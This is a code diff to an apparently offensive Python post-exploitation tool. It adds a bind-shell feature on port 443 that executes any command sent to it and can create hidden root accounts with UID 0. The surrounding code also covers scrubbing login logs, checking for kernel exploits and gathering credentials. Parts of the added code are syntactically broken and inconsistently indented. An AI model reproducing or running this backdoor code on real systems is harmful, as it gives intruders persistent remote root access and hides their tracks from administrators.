@@ -32,6 +32,7 @@ import shutil
 import getopt
 import tarfile
 import socket
+import string
 import random, string
 import logging
 import struct
@@ -67,8 +68,9 @@ def usage():
    print("  -p --protection     locate commonly installed AV, FW's and extras")
    print("  -a --all-tests      run all and archive final reports *scapy required")
    print("  -t --tar            make archive of final reports")
-   print("  -h --help           prints this menu")
    print("  -s --scrub          scrubs current user/ip from utmp, wtmp & lastlog")
+   print("  -b --bind           opens bindshell on port 443")  
+   print("  -h --help           prints this menu")
    print("usage: ./intersect.py --daemon --network --protection")
    print("       ./intersect.py --all-tests\n")
    sys.exit()
@@ -159,7 +161,7 @@ def Gather_OS():
    file.close()
    os.system("ls -alhR ~/ > userhome.txt")
    os.system("ls -alhR /home > allusers.txt")
-
+   
    
 def GetCredentials():
     # Feature is being rewritten to speed up process and avoid non-root permission issues
@@ -492,7 +494,56 @@ def exploitCheck():
             print "WARNING: %s appears to be a modified version of kernel %s." % (kernel_version_string, kernel_version)
             print "These exploits *might* allow you to obtain root access by privilege escalation, but this feature does not take in account kernels that are modified or otherwise patched\n"
 
-    
+
+def bindShell():
+    HOST = ''
+    PORT = 443
+    socksize = 4096
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((HOST, PORT))
+    print "[!] Shell bound on 443"
+    server.listen(5)
+    conn, addr = server.accept()
+    print "[!] New Connection: %s" % addr[0]
+    conn.send("Intersect:"+str(os.getcwd())+" $ ")
+
+    while True:
+        cmd = conn.recv(socksize)
+        proc = Popen(cmd,
+             shell=True,
+             stdout=subprocess.PIPE,
+             stderr=subprocess.PIPE,
+             stdin=subprocess.PIPE,
+             )
+        stdout, stderr = proc.communicate()
+        if cmd.startswith('cd'):
+            os.chdir(cmd[3:].replace('\n',''))
+            conn.send("\nIntersect:"+str(os.getcwd())+" $ ")
+        if cmd.startswith('adduser'):
+           strip = cmd.split(" ")
+           acct = strip[1]
+           os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
+           conn.send("[!] Root account " + acct + " has been created.")   
+  # Ignore this code. This is incomplete and also needs the client-side script to properly utilize these commands.
+   # Custom client-side shell coming soon.
+        #elif cmd.startswith('download'):
+            #strip = cmd.split(" ")
+            #sendfile = strip[1]
+            #conn.sendall(sendfile)
+       # elif cmd.startswith('isniff'):
+           #strip = cmd.split(" ")
+            #iface = strip[1]
+            #cmd = 'tcpdump -Xs 1514 -vv -n -w - -i %s' % iface
+            #conn.sendall( stdout )
+        elif proc:
+            conn.sendall( stdout )
+            conn.send("\nIntersect:"+str(os.getcwd())+" $ ")
+        elif proc:
+    	        conn.sendall("[!] Error: " + stderr)
+            conn.send("\nIntersect"+str(os.getcwd())+" $ ")
+
+
+
 def MakeArchive():
     # Full version features option to send reports over ssh/sftp to a remote host of your choice
     print("[!] Generating report archive....This might take a minute or two..")
@@ -561,7 +612,7 @@ def main(argv):
     # figure out way to run environment() ONLY if a user gives an option
     # or if i must create it anyways, rm -rf the empty directory if it isnt used by commands
     try:
-        opts, args = getopt.getopt(argv, "dhtonlcpsa", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "protection", "scrub", "all-tests"])
+        opts, args = getopt.getopt(argv, "dhtonlcpsba", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "protection", "scrub", "bind", "all-tests"])
     except getopt.GetoptError, err:
         print str(err) 
         usage()
@@ -587,6 +638,8 @@ def main(argv):
              FindProtect()
         elif o in ("-s", "--scrub"):
 	     ScrubLog()
+        elif o in ("-b", "--bind"):
+             bindShell()
         elif o in ("-a", "--all-tests"):
              Gather_OS()
              NetworkInfo()
